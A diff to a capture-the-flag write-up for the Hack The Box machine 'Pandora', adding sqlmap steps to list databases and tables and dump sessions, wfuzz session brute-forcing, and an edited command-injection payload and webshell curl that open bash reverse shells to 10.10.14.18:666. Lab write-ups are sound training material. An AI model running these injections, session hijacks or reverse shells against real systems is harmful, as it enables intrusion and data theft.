@@ -33,7 +33,7 @@ wfuzz -u http://panda.htb -H "Host: FUZZ.panda.htb" \
   --hh 33560
 ```
 
-**[SNMP](SNMP) Enumeration:**
+**[SNMP](SNMP.md) Enumeration:**
 ```bash
 snmpwalk -v 2c -c public 10.10.11.136 | tee snmp-full
 snmpbulkwalk -Cr1000 -c public -v2c 10.10.11.136 > snmp-full-bulk
@@ -83,9 +83,23 @@ http://pandora.panda.htb:9001/pandora_console/include/chart_generator.php?sessio
 sqlmap -u 'http://pandora.panda.htb:9001/pandora_console/include/chart_generator.php?session_id=1'
 ```
 
+### Find Databases
+```bash
+sqlmap -u 'http://pandora.panda.htb:9001/pandora_console/include/chart_generator.php?session_id=1' --dbs --batch
+```
+
+### Find tables
+```bash
+sqlmap -u 'http://pandora.panda.htb:9001/pandora_console/include/chart_generator.php?session_id=1' -D pandora --tables --batch
+```
+
 **Dump Pandora Sessions:**
 ```bash
 sqlmap -D pandora -T tsessions_php --dump --where "data<>''"
+```
+
+```bash
+wfuzz -u http://pandora.panda.htb:9001/pandora_console/ -b PHPSESSID=FUZZ -w sessions
 ```
 
 **Replay Session (Replace Cookie):**
@@ -102,17 +116,20 @@ Cookie: PHPSESSID=g4e01qdgk36mfdh90hvcc54umq
 POST /pandora_console/ajax.php
 Cookie: PHPSESSID=g4e01qdgk36mfdh90hvcc54umq
 
-page=include/ajax/events&perform_event_response=10000000&target=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.6/443+0>%261"&response_id=1
+page=include/ajax/events&perform_event_response=10000000&target=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.18/666+0>%261"&response_id=1
 ```
 
 **Listener:**
 ```bash
-nc -nvlp 443
+nc -nvlp 666
 ```
 
 **Shell Upgrade:**
 ```bash
 script /dev/null -c bash
+```
+
+```
 ^Z
 stty raw -echo; fg
 reset
@@ -134,7 +151,7 @@ http://127.0.0.1:9001/pandora_console/include/chart_generator.php?session_id=' u
 
 **Execute Reverse Shell via Webshell:**
 ```bash
-curl 'http://pandora.panda.htb:9001/pandora_console/images/0xdf.php?cmd=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.6/443+0>%261"'
+curl 'http://pandora.panda.htb:9001/pandora_console/images/0xdf.php?cmd=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.18/666+0>%261"'
 ```
 
 ---
